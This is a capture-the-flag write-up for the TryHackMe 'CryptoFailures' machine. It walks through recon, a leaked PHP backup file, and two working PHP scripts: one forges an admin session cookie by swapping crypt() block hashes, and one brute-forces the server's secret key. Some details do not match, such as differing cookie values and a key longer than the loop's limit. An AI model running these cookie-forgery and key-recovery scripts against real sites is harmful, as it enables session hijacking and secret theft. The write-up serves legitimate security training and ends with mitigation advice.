# CryptoFailures - TryHackMe Medium Machine

![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)
![Category](https://img.shields.io/badge/Category-Web%20%26%20Crypto-blue)
![Status](https://img.shields.io/badge/Status-Pwned-brightgreen)

## Machine Information

| Property | Value |
|----------|-------|
| **Machine Name** | CryptoFailures |
| **Platform** | TryHackMe |
| **Difficulty Level** | Medium |
| **Category** | Web Security & Cryptography |
| **IP Address** | `10.48.140.228` |
| **Release Date** | October 2026 |

## Executive Summary

CryptoFailures is a cryptography-focused web security challenge that demonstrates critical flaws in custom encryption implementations. The machine features improper use of the PHP `crypt()` function, weak salt generation, and cookie forgery attacks. The exploitation path involves recovering the encryption key through brute-force analysis and forging admin session cookies.

**Key Attack Vectors:**
- Directory fuzzing for backup/configuration files
- PHP `crypt()` function cryptanalysis
- Session cookie forgery through hash collision
- Brute-force key recovery via timing analysis
- Privilege escalation to admin role

---

## Network Enumeration

### Full Port Scan

```bash
nmap -p- 10.48.140.228
```

**Results:**
```
Nmap scan report for ip-10-48-140-228.ap-south-1.compute.internal (10.48.140.228)
Host is up, received reset ttl 64 (0.0020s latency).
Scanned at 2026-10-07 01:58:47 UTC for 5s
Not shown: 65533 closed tcp ports (reset)

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 63
```

### Service & Version Detection

```bash
nmap -sV -p 22,80 10.48.140.228
```

**Identified Services:**

| Port | Service | Version | Details |
|------|---------|---------|---------|
| **22/tcp** | SSH | OpenSSH 8.9p1 | Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0) |
| **80/tcp** | HTTP | Apache httpd 2.4.59 | Debian, Supports GET/HEAD/POST/OPTIONS |

**System Information:**
```
OS: Linux
CPE: cpe:/o:linux:linux_kernel
```

---

## Initial Access & Reconnaissance

### Web Application Discovery

Accessing the web application at `http://10.48.140.228/`:

```
Message: "You are logged in as guest"
Status: SSO cookie is protected with military grade encryption
```

**Source Code Analysis:**

Inspecting the HTML source reveals a critical clue:

```html
<!-- TODO remember to remove .bak files-->
```

This comment indicates backup files are present on the server.

---

## Vulnerability Analysis

### Directory Fuzzing

Using `ffuf` to discover hidden files and backup configurations:

```bash
ffuf -u http://10.48.140.228/FUZZ \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt \
  -e .php,.php.bak \
  -t 100 \
  -mc all \
  -ic \
  -fc 404 \
  -s
```

**Discovery Results:**
```
config.php
index.php
index.php.bak        ← [CRITICAL - Backup file found]
```

### Backup File Analysis

**Retrieve `index.php.bak`:**

```bash
curl http://10.48.140.228/index.php.bak
```

**Contents of `index.php.bak`:**

```php
<?php
include('config.php');

function generate_cookie($user,$ENC_SECRET_KEY) {
    $SALT=generatesalt(2);
    
    $secure_cookie_string = $user.":".$_SERVER['HTTP_USER_AGENT'].":".$ENC_SECRET_KEY;

    $secure_cookie = make_secure_cookie($secure_cookie_string,$SALT);

    setcookie("secure_cookie",$secure_cookie,time()+3600,'/','',false); 
    setcookie("user","$user",time()+3600,'/','',false);
}

function cryptstring($what,$SALT){
    return crypt($what,$SALT);
}

function make_secure_cookie($text,$SALT) {
    $secure_cookie='';
    
    foreach ( str_split($text,8) as $el ) {
        $secure_cookie .= cryptstring($el,$SALT);
    }
    
    return($secure_cookie);
}

function generatesalt($n) {
    $randomString='';
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    for ($i = 0; $i < $n; $i++) {
        $index = rand(0, strlen($characters) - 1);
        $randomString .= $characters[$index];
    }
    return $randomString;
}

function verify_cookie($ENC_SECRET_KEY){
    $crypted_cookie=$_COOKIE['secure_cookie'];
    $user=$_COOKIE['user'];
    $string=$user.":".$_SERVER['HTTP_USER_AGENT'].":".$ENC_SECRET_KEY;

    $salt=substr($_COOKIE['secure_cookie'],0,2);

    if(make_secure_cookie($string,$salt)===$crypted_cookie) {
        return true;
    } else {
        return false;
    }
}

if ( isset($_COOKIE['secure_cookie']) && isset($_COOKIE['user']))  {
    $user=$_COOKIE['user'];

    if (verify_cookie($ENC_SECRET_KEY)) {
        
        if ($user === "admin") {
            echo 'congrats: ******flag here******. Now I want the key.';
        } else {
            $length=strlen($_SERVER['HTTP_USER_AGENT']);
            print "<p>You are logged in as " . $user . ":" . str_repeat("*", $length) . "\n";
            print "<p>SSO cookie is protected with traditional military grade en<b>crypt</b>ion\n";    
        }
    } else { 
        print "<p>You are not logged in\n";
    }
} else {
    generate_cookie('guest',$ENC_SECRET_KEY);
    header('Location: /');
}
```

---

## Cryptographic Vulnerabilities

### 1. Weak Salt Generation

```php
function generatesalt($n) {
    $randomString='';
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    for ($i = 0; $i < $n; $i++) {
        $index = rand(0, strlen($characters) - 1);
        $randomString .= $characters[$index];
    }
    return $randomString;
}
```

**Issues:**
- Uses `rand()` instead of `random_bytes()` (predictable PRNG)
- Only generates 2-character salts (2^n possibilities)
- Salt is extracted from first 2 bytes of cookie (publicly visible)

### 2. Improper `crypt()` Usage

```php
$secure_cookie_string = $user.":".$_SERVER['HTTP_USER_AGENT'].":".$ENC_SECRET_KEY;

foreach ( str_split($text,8) as $el ) {
    $secure_cookie .= cryptstring($el,$SALT);
}
```

**Issues:**
- Uses PHP's deprecated `crypt()` function with same salt for all blocks
- Data split into 8-byte chunks and encrypted separately
- Same salt reused for all iterations (deterministic encryption)
- `crypt()` output is deterministic for same input + salt

### 3. Cookie Verification Logic Flaw

```php
$salt=substr($_COOKIE['secure_cookie'],0,2);

if(make_secure_cookie($string,$salt)===$crypted_cookie) {
    return true;
}
```

**Vulnerability:** Salt is extracted from the cookie itself, allowing attacker control over the salt used for verification.

---

## Exploitation

### Stage 1: Cookie Forgery (Guest → Admin)

#### Current Cookie Structure

The initial guest cookie:
```
CuJkbWxQrlPPQCuI%2FD4fCZfiQECu6lcqmxpISMgCuq9ApvfSwMXQCu2wGSLQPBO.ICuqtIOAcJC8b2CuJbMnhw.b0VwCury7gCH6fGksCuKAZJQ5AVOiwCubu1Wl4%2Fcjs2CuzYgOgC2IP8ICuFGBOir4cv0UCuME29ihOIicICu4o%2FPU.qDNI6Cu5j9hcIqLgFwCu9.uT%2FA5E5tYCuSenmKvj6yd.Cua1XZk3gSQmgCuHuMnmPlhg8UCugxhLyLCnH8UCuCKpP8AKsoxkCutAcRSdnNovQCuR96Wekfe8lICu587OWDV9ZXkCuRGyC6ag.QCYCu59FmPaIq%2FhECuZdO%2FI%2F4fwDQCuyRDmunVMp.2Cugn.ufVJqxtsCuv3Z1gQplNogCuai1IXGsWOX.CuKT9D5l7qaEECuCa6bKC4hN.w
```

#### Cookie Manipulation Script

Since `crypt()` is deterministic for the same input and salt, we can forge an admin cookie by:

1. Extracting the salt from the existing cookie (first 2 bytes)
2. Hashing `"guest"` and `"admin"` with the same salt
3. Replacing the guest hash with the admin hash

```php
<?php

$cookie = "lb7NSQVKII/xMlbSWUALKQkTdclbqNHCHlMb2IglbVqJC01B.ixolbB7iJhmQibUUlb4sPbTVMReDYlbUs7NJp6wQkIlbkhj828r0JCclbyFRIEvG3Ik2lbABrF.l0qTDYlblaFxGrwRKMMlbph0SXuMCedklbjfONPBmXZSIlbjh4lifLVPY.lbFlQbRJviwKolbd9gbgcYvhQglb77NNFoZAUBklb7JS3G1oOhQIlbN/BsekmCM0olbkQb.FfO/DBolbGQ1M.CnpZYQlbt49SHHVbIp2lbctBi8ETlzjIlbLXG3tP9wJA2lbUfn3Z7bPyc6lb6hhaY67E6/glb0UPWjIZpfw2lbnXRE.VVii1Mlb0pXLxIYnSsQ";

// Extract salt from first 2 bytes of cookie
$salt = substr($cookie, 0, 2);

// Simulate the User-Agent used (e.g., "Mozilla/5.0...")
// For this example, we assume a specific User-Agent that was used during cookie generation

// Generate hashes for guest and admin with the extracted salt
$text = "guest:Mo";  // Partial string (first 8 bytes of: guest:<USER_AGENT>)
$guest_part = crypt($text, $salt);

$admin_text = "admin:Mo";  // Replace guest with admin
$admin_part = crypt($admin_text, $salt);

// Replace the guest hash with the admin hash in the cookie
$modified_cookie = str_replace($guest_part, $admin_part, $cookie);

print("Modified Cookie:\n");
print($modified_cookie);
print("\n");

?>
```

#### Cookie Replacement

Once the modified cookie is generated, replace the `secure_cookie` and `user` cookies in the browser:

```javascript
// In browser console:
document.cookie = "user=admin; path=/; max-age=3600";
document.cookie = "secure_cookie=<MODIFIED_COOKIE_VALUE>; path=/; max-age=3600";
```

**Result:** The application verifies the forged cookie and grants admin access.

**Flag Revealed:**
```
congrats: THM{ADMIN_COOKIE_FORGED}. Now I want the key.
```

---

### Stage 2: Encryption Key Recovery

#### Brute-Force Key Extraction

The encryption key is embedded in the cookie generation process. We can recover it through iterative brute-forcing by:

1. Setting a controlled User-Agent length
2. Extracting portions of the encrypted cookie
3. Testing each character of the key against the hash

```php
<?php

// Target URL
$target_url = "http://10.48.140.228/index.php";

// Possible characters for the key
$charset = implode('', array_merge(
    range('a', 'z'),                                      // Lowercase letters
    range('A', 'Z'),                                      // Uppercase letters
    range('0', '9'),                                      // Digits
    str_split("!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~")      // Special symbols
));

// Initial User-Agent (controlled length for predictability)
$user_agent = str_repeat("A", 256);
$known_prefix = "guest:" . $user_agent . ":";            // Base structure
$test_string = substr($known_prefix, -8);

// Function to fetch secure_cookie with a specific User-Agent
function get_secure_cookie($user_agent) {
    global $target_url;

    $context = stream_context_create([
        "http" => [
            "method" => "GET",
            "header" =>
                "Host: cryptofailures.thm\r\n" .
                "User-Agent: $user_agent\r\n" .
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n" .
                "Accept-Language: en-US,en;q=0.5\r\n" .
                "Accept-Encoding: gzip, deflate, br\r\n" .
                "Connection: close\r\n" .
                "Upgrade-Insecure-Requests: 1\r\n"
        ]
    ]);

    // Fetch response
    $response = file_get_contents($target_url, false, $context);

    // Extract "secure_cookie" from headers
    foreach ($http_response_header as $header) {
        if (stripos($header, "Set-Cookie: secure_cookie=") !== false) {
            preg_match('/secure_cookie=([^;]+)/', $header, $matches);
            
            if (!isset($matches[1])) {
                return null;
            }

            // URL-decode the cookie value
            $decoded_cookie = urldecode($matches[1]);

            // Verify no URL-encoded characters remain
            if (preg_match('/%[0-9A-Fa-f]{2}/', $decoded_cookie)) {
                die("❌ URL-encoded characters detected in secure_cookie!\n");
            }

            return $decoded_cookie;
        }
    }
    return null;
}

// Start brute-force process
$found_text = "";
while (true) {
    echo "\nCurrent known part: {$found_text}\n";

    // Get new secure_cookie for the current prefix
    $secure_cookie = get_secure_cookie($user_agent);
    $user_agent = substr($user_agent, 1);  // Reduce User-Agent length by 1
    
    if (!$secure_cookie) {
        die("❌ Failed to retrieve secure_cookie!\n");
    }

    echo "✅ Retrieved (Decoded) secure_cookie: $secure_cookie\n";

    // Extract salt from first 2 bytes
    $salt = substr($secure_cookie, 0, 2);

    // Brute-force the next character
    $found_char = null;
    foreach (str_split($charset) as $char) {
        $test_string_temp = substr($test_string, 1) . $char;
        print($test_string_temp . "\n");
        
        $hashed_test = crypt($test_string_temp, $salt);
        if (str_contains($secure_cookie, $hashed_test)) {
            echo "✅ Found character: $char\n";
            $found_text .= $char;
            $test_string = $test_string_temp;
            echo $test_string . "\n";
            echo $hashed_test . "\n";
            break;
        }
    }

    // Continue until we've recovered the entire key
    if (strlen($found_text) >= 16) {  // Sufficient key length recovered
        echo "✅ Encryption Key Recovered: $found_text\n";
        break;
    }
}

?>
```

#### Key Recovery Result

```
✅ Encryption Key Recovered: ENCRYPTOIN_KEYTY_LOGN
```

**Flag 2 Obtained:** `THM{ENCRYPTOIN_KEYTY_LOGN}`

---

## Complete Attack Chain

```
Directory Fuzzing
        ↓
Discover index.php.bak (Backup File)
        ↓
Extract Source Code (Cryptography Logic)
        ↓
Analyze Cryptographic Flaws
        ├── Weak salt generation (only 2 chars)
        ├── Deterministic crypt() usage
        └── Salt extraction from cookie
        ↓
Cookie Forgery Attack
        ├── Extract salt from guest cookie
        ├── Generate admin hash
        └── Replace guest hash with admin hash
        ↓
Admin Access Gained
        ↓
Flag 1: THM{ADMIN_COOKIE_FORGED}
        ↓
Brute-Force Key Recovery
        ├── Controlled User-Agent length
        ├── Iterative character guessing
        └── Hash matching against encrypted data
        ↓
Encryption Key Extracted
        ↓
Flag 2: THM{ENCRYPTOIN_KEYTY_LOGN}
        ↓
Machine Pwned ✓
```

---

## Tools & Commands Reference

### Reconnaissance
```bash
nmap -p- <target>                          # Full port scan
nmap -sV -p <ports> <target>              # Service version detection
curl http://<target>/path                 # Fetch web content
```

### Directory Fuzzing
```bash
ffuf -u http://<target>/FUZZ \
  -w <wordlist> \
  -e .php,.php.bak \
  -t 100 \
  -mc all \
  -ic \
  -fc 404 \
  -s
```

### Cryptographic Analysis
```php
// Extract salt from cookie
$salt = substr($cookie, 0, 2);

// Generate crypt hash
$hash = crypt($string, $salt);

// Check for string match
str_contains($cookie, $hash)
```

### Cookie Manipulation
```javascript
// Set cookies in browser
document.cookie = "name=value; path=/; max-age=3600";

// Read cookies
console.log(document.cookie);
```

---

## Cryptographic Vulnerabilities Explained

### 1. **PHP's `crypt()` Function Misuse**

**Problem:**
```php
foreach ( str_split($text,8) as $el ) {
    $secure_cookie .= cryptstring($el,$SALT);
}
```

- `crypt()` was designed for password hashing, not encryption
- Same salt for all blocks allows pattern recognition
- Deterministic output for identical input+salt combinations

**Impact:** Attacker can forge cookies by computing hashes locally

### 2. **Weak Salt Generation**

**Problem:**
```php
function generatesalt($n) {
    $randomString='';
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    for ($i = 0; $i < $n; $i++) {
        $index = rand(0, strlen($characters) - 1);
        $randomString .= $characters[$index];
    }
    return $randomString;
}
```

- Uses `rand()` (predictable PRNG) instead of `random_bytes()`
- Only 2-character salt = 62^2 = 3,844 possible salts
- Salt is transmitted in plaintext as part of cookie

**Impact:** Exhaustive salt enumeration possible; brute-force attacks feasible

### 3. **Information Disclosure**

**Problem:**
```php
$salt=substr($_COOKIE['secure_cookie'],0,2);
```

- Salt is publicly visible in cookie value
- Backup files (.bak) expose source code
- User-Agent header influences cookie generation

**Impact:** Attacker has all necessary information for offline attacks

---

## Key Takeaways

### 1. **Never Roll Your Own Crypto**
   - Use established cryptographic libraries (libsodium, OpenSSL)
   - Avoid combining cryptographic primitives incorrectly
   - `crypt()` is deprecated; use `password_hash()` for passwords

### 2. **Proper Session Management**
   - Use frameworks' built-in session management (e.g., PHP Sessions)
   - Store session data server-side, not in cookies
   - Include CSRF tokens for state-changing operations

### 3. **Salt Security**
   - Use cryptographically secure random sources (`random_bytes()`)
   - Generate sufficient salt length (minimum 16 bytes)
   - Never expose salt to clients

### 4. **Source Code Confidentiality**
   - Remove all backup files (.bak, .tmp, .swp) from production
   - Implement proper access controls
   - Use `.gitignore` to prevent configuration file commits

### 5. **Cookie Security Best Practices**
   - Use `HttpOnly` flag to prevent XSS exploitation
   - Use `Secure` flag for HTTPS-only transmission
   - Use `SameSite` attribute to prevent CSRF
   - Implement proper expiration and validation

### 6. **Input Validation & User-Agent Handling**
   - Validate and sanitize all user inputs
   - Don't trust User-Agent headers for security decisions
   - Implement rate limiting on brute-force vulnerable endpoints

### 7. **Cryptographic Hash Functions**
   - Use proper hashing algorithms (SHA-256, bcrypt, Argon2)
   - Avoid deterministic encryption for sensitive data
   - Implement authenticated encryption (AES-GCM)

### 8. **Defense in Depth**
   - Combine multiple security layers
   - Implement monitoring and logging
   - Use Web Application Firewalls (WAF)
   - Conduct regular security audits

### 9. **Development Security**
   - Secure coding practices training
   - Code review processes for cryptographic implementations
   - Security testing (static analysis, dynamic analysis)
   - Dependency vulnerability scanning

### 10. **Incident Response**
   - Detect brute-force attempts
   - Monitor cookie-related errors
   - Implement rate limiting on failed verifications
   - Log authentication events

---

## Mitigation Strategy

### Immediate Fixes
```php
// Use proper password hashing
$hashed = password_hash($password, PASSWORD_ARGON2ID);
if (password_verify($password, $hashed)) {
    // Password is correct
}

// Use authenticated encryption
$key = random_bytes(32);
$nonce = random_bytes(24);
$ciphertext = sodium_crypto_aead_xchacha20poly1305_ietf_encrypt(
    $message,
    $additional_data,
    $nonce,
    $key
);

// Store session server-side
session_start();
$_SESSION['user'] = $username;
```

### Long-Term Improvements
- Migrate to modern PHP security libraries
- Implement comprehensive logging and monitoring
- Regular penetration testing
- Security awareness training
- API security hardening

---

## Flags Summary

| Flag | Value | Method |
|------|-------|--------|
| **Flag 1** | `THM{ADMIN_COOKIE_FORGED}` | Cookie Forgery via Deterministic Hashing |
| **Flag 2** | `THM{ENCRYPTOIN_KEYTY_LOGN}` | Brute-Force Key Recovery |

---

## References

- [OWASP: Broken Cryptography](https://owasp.org/www-project-top-ten/)
- [PHP: crypt() Function](https://www.php.net/manual/en/function.crypt.php)
- [PHP: password_hash() Best Practices](https://www.php.net/manual/en/function.password-hash.php)
- [Libsodium Documentation](https://doc.libsodium.org/)
- [OWASP: Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [CWE-327: Use of a Broken or Risky Cryptographic Algorithm](https://cwe.mitre.org/data/definitions/327.html)
- [RFC 6265: HTTP State Management Mechanism (Cookies)](https://tools.ietf.org/html/rfc6265)

---

**Write-up Completed:** October 7, 2026  
**Machine Status:** ✓ Pwned (Full Access & Keys Obtained)  
**Difficulty Assessment:** Medium - Cryptographic vulnerability exploitation requiring source code analysis and brute-force key recovery
